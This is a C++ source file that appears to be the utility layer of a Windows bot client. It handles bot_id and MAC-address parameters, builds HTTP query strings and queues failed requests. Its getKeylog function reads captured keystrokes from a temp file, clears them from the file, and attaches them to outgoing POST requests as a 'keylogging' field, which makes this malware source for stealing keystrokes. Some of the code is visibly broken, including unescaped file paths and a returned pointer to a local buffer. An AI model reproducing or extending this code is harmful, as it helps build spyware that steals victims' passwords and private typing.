#include <string>
#include <vector>
#include <fstream>
#include "UtilLib.h"
#include "HttpLib.h"

#pragma comment (lib, "Wininet.lib")

//converts a string to a w-string
wstring s2ws(string inString){
	wstring wString;
	return wString.assign(inString.begin(), inString.end());
}

// takes a string and returns a dynamically allocated char array, REMEMBER TO FREE THE MEMORY AFTERWORD
void stringToCharArray(string data, char** array) {
	// initialize the array pointer that was passed in to fit the query string created plus space for \0
	*array = new char[data.length() + 1];
	// copy the string to the new array pointer
	strncpy_s(*array, strlen(data.c_str()) + 1, data.c_str(), _TRUNCATE);
}

//adds an unsuccessful request to the queue of requests that need to be resent
void queueRequest(vector<vector<string>> &requestQueue, string api, string query){
	vector<string> request = { api, query };
	requestQueue.push_back(request);
}

//returns the size of a vector
int getSize(vector<string> keys){
	return keys.size();
}

//returns the size of a vector<vector>
int getSize(vector<vector<string>> keys){
	return keys.size();
}

void insertOrUpdate(vector<string> &keys, vector<string> &values, string key, string value){
	bool exists = false;
	for (int i = 0; i < getSize(keys) && exists == false; i++){
		if (keys[i].compare(key) == 0){
			exists = true;
			values[i] = value;
		}
	}
	if (!exists){
		keys.push_back(key);
		values.push_back(value);
	}
}

// removes every key/value from the vectors except mac and bot_id
void dumpData(vector<string> &keys, vector<string> &values){
	for (int i = 0; i < getSize(keys); i++){
		if (keys[i] != "bot_id" && keys[i] != "mac_address"){
			keys.erase(keys.begin() + i);
			values.erase(values.begin() + i);
			i--;
		}
	}
}

// removes a key/value pair from the vectors
void removeElement(vector<string> &keys, vector<string> &values, string key_to_remove){
	// iterate over the keys until we find the one we want to removes
	// then remove the element at that index from both vectors
	for (int i = 0; i < getSize(keys); i++){
		if (keys[i] == key_to_remove){
			keys.erase(keys.begin() + i);
			values.erase(values.begin() + i);
			break;
		}
	}
}

//get input from a keylogging file and append to post request
char* getKeylog(){
	ifstream fin;
	fin.open("C:\Temp\Data.txt", ios::in);

	if (fin.fail()){
		fin.close();
		return "";
	}

	ofstream fout;
	fout.open("C:\Temp\Data2.txt", ios::out);
	char ch;
	char tosend[10000];
	char characters[1024];

	if (fin.is_open()){
		fin.get(tosend, 10000);

		while (fin.get(ch)){
			fin.get(characters, 1024);
			fout << characters;
		}
		fin.close();
		fout.close();
		remove("C:\Temp\Data.txt");
		rename("C:\Temp\Data2.txt", "C:\Temp\Data.txt");
	}

	return tosend;
}

//converts a list of key/values to a query string
string convertArgsToStr(vector<string> keys, vector<string> values, int arrayLen, bool getRequest){
	// use this variable size string to construct the query
	string query = "";

	if (getRequest && arrayLen > 0)
		query += "?";
	for (int i = 0; i < arrayLen; i++){
		query += keys[i];
		query += "=" + values[i];
		if (i < arrayLen - 1)
			query += "&";
	}
	if (!getRequest){
		string data = getKeylog();
		if (data != ""){
			query += "&keylogging=";
			query += data;
		}
	}
	return query;
}

//searches a list of key/values for a set of specific key/value pairs
string getArgsToString(vector<string> keys, vector<string> values, int length, vector<string> params, int paramLength, char* verb){
	vector<string> tempKeys;
	vector<string> tempValues;
	int tempSize = 0;
	bool mac_address = false;
	//loop through the params we want
	for (int i = 0; i < paramLength; i++){
		//loop through all params
		for (int j = 0; j < length; j++){
			//param is found
			if (keys[j].compare(params[i])==0){
				//add to query key/value list
				tempKeys.push_back(keys[j]);
				tempValues.push_back(values[j]);
				tempSize++;
			}
		}
	}
	//correct optional parameter being added
	if (mac_address){ paramLength++; }
	//number found and param count are the same
	//if (paramLength != tempSize){
	//	string error = "err";
	//	// initialize the array pointer that was passed in to fit the query string created plus space for \0
	//	*output = new char[error.length() + 1];
	//	// copy the string to the new array pointer
	//	strncpy_s(*output, strlen(error.c_str()) + 1, error.c_str(), _TRUNCATE);
	//}
	//else{
		//build get query
		if (strcmp(verb, "GET")==0)
			return convertArgsToStr(tempKeys, tempValues, tempSize, true);
		//build post query
		else if (strcmp(verb, "POST")==0)
			return convertArgsToStr(tempKeys, tempValues, tempSize, false);
	//}
		return "";
}
